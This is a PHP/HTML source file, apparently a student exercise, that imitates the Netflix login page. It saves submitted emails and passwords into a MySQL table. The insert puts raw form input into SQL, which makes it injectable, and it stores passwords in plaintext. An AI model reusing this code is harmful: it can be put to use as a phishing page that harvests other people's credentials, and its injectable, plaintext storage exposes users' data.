<?php

if(isset($_POST['submit'])){

include_once('config.php');

$email = $_POST['E-mail'];
$senha = $_POST['Senha'];

$result = mysqli_query($conexao, "INSERT INTO usuario(email, senha) values('$email', '$senha')");

}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>aulasexta</title>
    <link rel="stylesheet" href="estilo.css">

    
</head>
<body>


<header>
 <img src="NetflixLogo.png" > 

</header>


  
<form action="index.php" method="POST">

<div class="login">
<form class="caixa">



<div class="ajustar">

<h1 style="font-size:30px; font-family: Netflix Sans, Helvetica Neue, Segoe UI, Roboto, Ubuntu, sans-serif" > Entrar</h1>

<br>
<label></label>
<input placeholder="Digite o seu email" type="text"  name="E-mail" id="E-mail" class="E-mail" style=" width:320px;
height:50px; background-color: #333333; border-radius: 5px; border: solid 0; padding-left: 20px; color:#fff;
font-weight: bold;" /> 
<br>
<br>

<label></label>
<input  placeholder="Digite a sua senha" type="text" name="Senha" style=" width:320px;
height:50px; background-color: #333333; border-radius: 5px; border: solid 0; padding-left: 20px; color:#fff;   font-weight: bold;" />
<br>
<br>
<br>
<input  type="submit" name="submit" id="submit" value="Entrar"  style="background-color:red; width:320px;
height:50px; border-radius: 5px;  border: solid 0; padding-left: 10px; color:white; font-weight: bold; cursor:pointer;  " />
<br>
<br>
<input type="checkbox"  />
<label class="texto">Lembre-se de mim</labe>      <a href="https://www.netflix.com/br/LoginHelp">Precisa de ajuda?</a>

</div>
</div>
</form> 




</body>
</html>